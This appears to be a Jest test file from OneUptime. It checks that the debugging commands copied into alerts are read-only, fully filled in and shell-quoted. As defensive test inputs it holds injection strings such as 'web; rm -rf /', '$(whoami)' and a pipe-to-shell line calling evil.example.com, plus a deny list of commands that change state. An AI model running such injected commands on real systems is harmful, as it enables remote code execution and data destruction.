import { JSONObject } from "../../../../Types/JSON";
import MonitorType from "../../../../Types/Monitor/MonitorType";
import SeriesDebugHints, {
  SeriesDebugCommand,
} from "../../../../Types/Monitor/SeriesContext/SeriesDebugHints";

/*
 * These commands are printed into an alert description and rendered on
 * the alert page with a Copy button, which makes them the highest-trust
 * text OneUptime emits: a tired engineer pastes them into a production
 * shell without reading. Three invariants therefore matter more than the
 * exact wording of any one command, and each has its own block below:
 *
 *   1. READ-ONLY. Nothing here may mutate, restart or delete.
 *
 *   2. NEVER HALF-FILLED. A command is emitted only when every
 *      identifier it interpolates is known, so no `kubectl logs  -n `
 *      ever reaches a human.
 *
 *   3. SHELL-SAFE. Label values are telemetry - an agent, a Prometheus
 *      scrape, or a user's own oneuptime.captureMetric() call chose
 *      them - so a value containing shell metacharacters must render as
 *      an inert argument, not as a second command.
 */

function getCommandStrings(input: {
  monitorType: MonitorType;
  seriesLabels: JSONObject;
}): Array<string> {
  return SeriesDebugHints.getDebugCommands(input).map(
    (command: SeriesDebugCommand) => {
      return command.command;
    },
  );
}

const KUBERNETES_POD_LABELS: JSONObject = {
  "resource.k8s.namespace.name": "prod",
  "resource.k8s.pod.name": "checkout-7d9f-2xk",
  "resource.k8s.container.name": "app",
  "resource.k8s.node.name": "ip-10-0-3-14",
};

describe("SeriesDebugHints", () => {
  describe("quoteForShell", () => {
    test("leaves an ordinary object name unquoted so it stays readable", () => {
      expect(SeriesDebugHints.quoteForShell("checkout-7d9f-2xk")).toBe(
        "checkout-7d9f-2xk",
      );
      expect(SeriesDebugHints.quoteForShell("/var/lib/docker")).toBe(
        "/var/lib/docker",
      );
      expect(SeriesDebugHints.quoteForShell("osd.12")).toBe("osd.12");
    });

    test("single-quotes anything carrying a shell metacharacter", () => {
      expect(SeriesDebugHints.quoteForShell("web; rm -rf /")).toBe(
        "'web; rm -rf /'",
      );
      expect(SeriesDebugHints.quoteForShell("a b")).toBe("'a b'");
      expect(SeriesDebugHints.quoteForShell("$(whoami)")).toBe("'$(whoami)'");
      expect(SeriesDebugHints.quoteForShell("`id`")).toBe("'`id`'");
      expect(SeriesDebugHints.quoteForShell("a&&b")).toBe("'a&&b'");
      expect(SeriesDebugHints.quoteForShell("a|b")).toBe("'a|b'");
      expect(SeriesDebugHints.quoteForShell("a\nb")).toBe("'a\nb'");
    });

    test("escapes an embedded single quote without ending the quoting", () => {
      /*
       * The close/escape/reopen dance. A naive implementation would
       * produce 'a'b', which terminates the quoted string early and
       * leaves `b` as a separate shell word.
       */
      expect(SeriesDebugHints.quoteForShell("a'b")).toBe(`'a'\\''b'`);
    });

    test("a value trying to break out stays inside one argument", () => {
      const quoted: string = SeriesDebugHints.quoteForShell(
        `'; curl evil.example.com | sh; echo '`,
      );

      /*
       * Every quote in the value is escaped, so the only unescaped
       * quotes left are the wrapper's own opening and closing pair.
       */
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      expect(quoted.split(`'\\''`).join("")).not.toContain("''");
    });
  });

  describe("Kubernetes", () => {
    test("names the pod, container and namespace in the first commands", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      });

      expect(commands).toContain(
        "kubectl describe pod checkout-7d9f-2xk -n prod",
      );
      expect(commands).toContain(
        "kubectl logs checkout-7d9f-2xk -c app -n prod --tail=200",
      );
      expect(commands).toContain(
        "kubectl logs checkout-7d9f-2xk -c app -n prod --previous --tail=200",
      );
      expect(commands).toContain(
        "kubectl top pod checkout-7d9f-2xk -n prod --containers",
      );
    });

    test("adds node-level commands when the series names a node", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      });

      expect(commands).toContain("kubectl describe node ip-10-0-3-14");
      expect(commands).toContain(
        "kubectl get pods --all-namespaces --field-selector spec.nodeName=ip-10-0-3-14 -o wide",
      );
    });

    test("omits -n rather than guessing when the namespace is unknown", () => {
      /*
       * Guessing "default" sends the engineer to the wrong namespace and
       * returns "not found". Omitting the flag uses their current
       * context, which is the correct fallback.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: { "resource.k8s.pod.name": "web-1" },
      });

      expect(commands).toContain("kubectl describe pod web-1");
      expect(
        commands.some((command: string) => {
          return command.includes("-n ");
        }),
      ).toBe(false);
    });

    test("omits -c rather than emitting an empty container flag", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          "resource.k8s.pod.name": "web-1",
          "resource.k8s.namespace.name": "prod",
        },
      });

      expect(commands).toContain("kubectl logs web-1 -n prod --tail=200");
    });

    test("emits nothing at all when no pod, node or workload is named", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: { "resource.k8s.cluster.name": "prod-eu" },
        }),
      ).toEqual([]);
    });

    test.each([
      [
        "resource.k8s.deployment.name",
        "checkout",
        "rollout status deployment/checkout",
      ],
      [
        "resource.k8s.statefulset.name",
        "kafka",
        "rollout status statefulset/kafka",
      ],
      ["resource.k8s.daemonset.name", "fluentd", "describe daemonset fluentd"],
      ["resource.k8s.job.name", "nightly", "describe job nightly"],
      ["resource.k8s.hpa.name", "web-hpa", "describe hpa web-hpa"],
    ])(
      "%s produces its own object-specific command",
      (key: string, value: string, expectedFragment: string) => {
        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: { [key]: value },
        });

        expect(
          commands.some((command: string) => {
            return command.includes(expectedFragment);
          }),
        ).toBe(true);
      },
    );

    test("a hostile pod name cannot become a second command", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          "resource.k8s.pod.name": "web; curl evil.example.com | sh",
          "resource.k8s.namespace.name": "prod",
        },
      });

      for (const command of commands) {
        /*
         * The dangerous substring may appear, but only INSIDE the single
         * quotes that make it one inert argument.
         */
        if (command.includes("curl evil.example.com")) {
          expect(command).toContain("'web; curl evil.example.com | sh'");
        }
      }
    });
  });

  describe("Docker and Podman", () => {
    test("uses the docker CLI for a Docker monitor", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Docker,
        seriesLabels: { "resource.container.name": "nginx" },
      });

      expect(commands).toContain("docker logs --tail 200 nginx");
      expect(commands).toContain("docker stats --no-stream nginx");
      expect(commands).toContain("docker top nginx");
    });

    test("uses the podman CLI for a Podman monitor", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Podman,
        seriesLabels: { "resource.container.name": "nginx" },
      });

      expect(commands).toContain("podman logs --tail 200 nginx");
      expect(
        commands.every((command: string) => {
          return !command.startsWith("docker ");
        }),
      ).toBe(true);
    });

    test("surfaces the exit code and OOM flag, which is what the page is about", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Docker,
        seriesLabels: { "resource.container.name": "nginx" },
      });

      expect(
        commands.some((command: string) => {
          return (
            command.includes("docker inspect") &&
            command.includes("OOMKilled") &&
            command.includes("ExitCode")
          );
        }),
      ).toBe(true);
    });

    test("emits nothing without a container name", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Docker,
          seriesLabels: { "resource.container.image.name": "nginx:1.25" },
        }),
      ).toEqual([]);
    });
  });

  describe("Docker Swarm", () => {
    test("adds service-level commands on top of the container ones", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.DockerSwarm,
        seriesLabels: {
          "container.name": "web.1.abc123",
          "docker.swarm.service.name": "web",
        },
      });

      expect(commands).toContain("docker logs --tail 200 web.1.abc123");
      expect(commands).toContain("docker service ps web --no-trunc");
      expect(commands).toContain("docker service logs --tail 200 web");
    });

    test("reads the unprefixed container.name the swarm agent emits", () => {
      /*
       * Unlike Docker/Podman, the docker_stats receiver in the Swarm
       * agent keeps container identity in DATAPOINT labels, so the key
       * has no `resource.` prefix.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.DockerSwarm,
        seriesLabels: { "container.name": "web.1.abc123" },
      });

      expect(commands.length).toBeGreaterThan(0);
    });
  });

  describe("Host", () => {
    test("investigates the mount that actually filled up", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { mountpoint: "/var", device: "/dev/nvme0n1p2" },
      });

      expect(commands).toContain("df -h /var && df -i /var");
      expect(
        commands.some((command: string) => {
          return command.includes("du -xh --max-depth=1 /var");
        }),
      ).toBe(true);
      expect(
        commands.some((command: string) => {
          return command.includes("iostat -x 1 3 /dev/nvme0n1p2");
        }),
      ).toBe(true);
    });

    test("checks inodes, not just bytes", () => {
      /*
       * "df -h says 60%" plus "disk full" errors is the classic inode
       * exhaustion signature, and it is invisible without df -i.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { mountpoint: "/var" },
      });

      expect(
        commands.some((command: string) => {
          return command.includes("df -i");
        }),
      ).toBe(true);
    });

    test("a mountpoint with a space stays one argument", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { mountpoint: "/mnt/my volume" },
      });

      expect(commands[0]).toContain("'/mnt/my volume'");
    });

    test("a Server monitor gets the same host commands", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Server,
          seriesLabels: { diskPath: "/var" },
        }).length,
      ).toBeGreaterThan(0);
    });

    test("emits nothing for a host-scalar series with no entity", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Host,
          seriesLabels: { "host.name": "prod-db-01" },
        }),
      ).toEqual([]);
    });
  });

  describe("Proxmox and Ceph", () => {
    test("Proxmox covers both the VM and the LXC spelling of a bare guest id", () => {
      /*
       * A hand-built monitor grouped on `vmid` alone does not say
       * whether the guest is a VM or an LXC container, so both CLIs are
       * offered - the wrong one just reports no such guest.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { vmid: "100" },
      });

      expect(commands).toContain("qm status 100 --verbose");
      expect(commands).toContain("pct status 100");
    });

    test("Proxmox reads the composite id the shipped templates group by", () => {
      /*
       * This is the shape the shipped templates actually produce:
       * pve-exporter puts identity in one `id` datapoint label, and the
       * templates group by it. Without parsing it, a Proxmox alert
       * carried an identity nothing could act on.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "qemu/100" },
      });

      expect(commands).toContain("qm status 100 --verbose");
      // A qemu guest is not an LXC container, so pct is not offered.
      expect(
        commands.some((command: string) => {
          return command.startsWith("pct ");
        }),
      ).toBe(false);
    });

    test("Proxmox offers only the LXC CLI for an lxc/ id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "lxc/101" },
      });

      expect(commands).toContain("pct status 101");
      expect(
        commands.some((command: string) => {
          return command.startsWith("qm ");
        }),
      ).toBe(false);
    });

    test("Proxmox prefers the agent's derived pve.type / pve.id over the raw id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: {
          id: "qemu/100",
          "pve.type": "lxc",
          "pve.id": "101",
        },
      });

      expect(commands).toContain("pct status 101");
    });

    test("Proxmox takes the last segment of a multi-segment storage id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "storage/pve1/local-lvm" },
      });

      expect(commands).toContain("pvesm status --storage local-lvm");
    });

    test("Proxmox investigates the node named by a node/ id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "node/pve1" },
      });

      expect(commands).toContain("pvecm status");
      expect(commands).toContain("pvesh get /nodes/pve1/status");
    });

    test("an unrecognised Proxmox id still gets a first command", () => {
      /*
       * Cluster-scoped ids ("cluster/production") and any future id
       * shape must not leave the alert with nothing to run.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "cluster/production" },
      });

      expect(commands).toContain("pvesh get /cluster/resources");
    });

    test("Ceph always starts from health detail", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Ceph,
        seriesLabels: { ceph_daemon: "osd.12" },
      });

      expect(commands[0]).toBe("ceph health detail");
      expect(commands).toContain("ceph daemon osd.12 status");
    });
  });

  describe("types with no universally safe command", () => {
    test.each([
      MonitorType.Metrics,
      MonitorType.IoTDevice,
      MonitorType.Website,
      MonitorType.Logs,
      MonitorType.Traces,
    ])("%s emits no commands", (monitorType: MonitorType) => {
      expect(
        getCommandStrings({
          monitorType,
          seriesLabels: { "device.id": "sensor-1", "service.name": "api" },
        }),
      ).toEqual([]);
    });

    test("an undefined monitor type emits no commands", () => {
      expect(
        SeriesDebugHints.getDebugCommands({
          monitorType: undefined,
          seriesLabels: KUBERNETES_POD_LABELS,
        }),
      ).toEqual([]);
    });

    test("an ungrouped monitor emits no commands", () => {
      expect(
        SeriesDebugHints.getDebugCommands({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {},
        }),
      ).toEqual([]);
      expect(
        SeriesDebugHints.getDebugCommands({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: undefined,
        }),
      ).toEqual([]);
    });
  });

  describe("every emitted command is read-only and complete", () => {
    const ALL_CASES: Array<{
      monitorType: MonitorType;
      seriesLabels: JSONObject;
    }> = [
      {
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      },
      {
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          "resource.k8s.namespace.name": "prod",
          "resource.k8s.deployment.name": "checkout",
          "resource.k8s.statefulset.name": "kafka",
          "resource.k8s.daemonset.name": "fluentd",
          "resource.k8s.job.name": "nightly",
          "resource.k8s.hpa.name": "web-hpa",
          "resource.k8s.node.name": "ip-10-0-3-14",
        },
      },
      {
        monitorType: MonitorType.Docker,
        seriesLabels: { "resource.container.name": "nginx" },
      },
      {
        monitorType: MonitorType.Podman,
        seriesLabels: { "resource.container.name": "nginx" },
      },
      {
        monitorType: MonitorType.DockerSwarm,
        seriesLabels: {
          "container.name": "web.1.abc",
          "docker.swarm.service.name": "web",
        },
      },
      {
        monitorType: MonitorType.Host,
        seriesLabels: {
          mountpoint: "/var",
          device: "/dev/sda1",
          "network.interface": "eth0",
        },
      },
      {
        monitorType: MonitorType.Proxmox,
        seriesLabels: { vmid: "100", node: "pve1", storage: "local-lvm" },
      },
      {
        monitorType: MonitorType.Ceph,
        seriesLabels: { ceph_daemon: "osd.12", pool_id: "3" },
      },
    ];

    /*
     * Verbs that change state. `rollout status` is read-only and must
     * not be caught by a bare "rollout" match, so the patterns are
     * deliberately specific.
     */
    const MUTATING_PATTERNS: Array<RegExp> = [
      /\bdelete\b/,
      /\bapply\b/,
      /\bpatch\b/,
      /\bedit\b/,
      /\bscale\b/,
      /\bdrain\b/,
      /\bcordon\b/,
      /\bevict\b/,
      /\bexec\b/,
      /\brollout (undo|restart|pause|resume)\b/,
      /\b(rm|kill|stop|start|restart|prune|reboot|shutdown)\b/,
      /\bset\b/,
      /*
       * A redirect that WRITES somewhere. `2>/dev/null` is how these
       * commands stay quiet about unreadable paths and is not a
       * mutation, so /dev/null is the one permitted target.
       */
      />\s*(?!\/dev\/null\b)\S/,
    ];

    test.each(ALL_CASES)(
      "$monitorType commands mutate nothing",
      (testCase: { monitorType: MonitorType; seriesLabels: JSONObject }) => {
        const commands: Array<string> = getCommandStrings(testCase);

        expect(commands.length).toBeGreaterThan(0);

        for (const command of commands) {
          for (const pattern of MUTATING_PATTERNS) {
            expect(command).not.toMatch(pattern);
          }
        }
      },
    );

    test.each(ALL_CASES)(
      "$monitorType commands never contain a blank interpolation",
      (testCase: { monitorType: MonitorType; seriesLabels: JSONObject }) => {
        for (const command of getCommandStrings(testCase)) {
          // A half-filled command shows up as a doubled or trailing space.
          expect(command).not.toMatch(/\s\s/);
          expect(command.trim()).toBe(command);
          // ...and as a flag with nothing after it.
          expect(command).not.toMatch(/(-n|-c)\s*$/);
        }
      },
    );

    test.each(ALL_CASES)(
      "$monitorType commands each explain what they answer",
      (testCase: { monitorType: MonitorType; seriesLabels: JSONObject }) => {
        for (const command of SeriesDebugHints.getDebugCommands(testCase)) {
          expect(command.purpose.length).toBeGreaterThan(0);
        }
      },
    );
  });

  describe("buildMarkdownBlock", () => {
    test("renders the commands as fenced markdown under a heading", () => {
      const block: string = SeriesDebugHints.buildMarkdownBlock({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      });

      expect(block).toContain("**Start here**");
      expect(block).toContain("kubectl describe pod checkout-7d9f-2xk -n prod");
      expect(block).toContain("```");
    });

    test("caps how many commands land in a notification", () => {
      const block: string = SeriesDebugHints.buildMarkdownBlock({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
        maxCommands: 2,
      });

      expect(block.split("- ").length - 1).toBe(2);
    });

    test("is empty when there is nothing to suggest", () => {
      expect(
        SeriesDebugHints.buildMarkdownBlock({
          monitorType: MonitorType.Metrics,
          seriesLabels: { "service.name": "api" },
        }),
      ).toBe("");
    });
  });
});
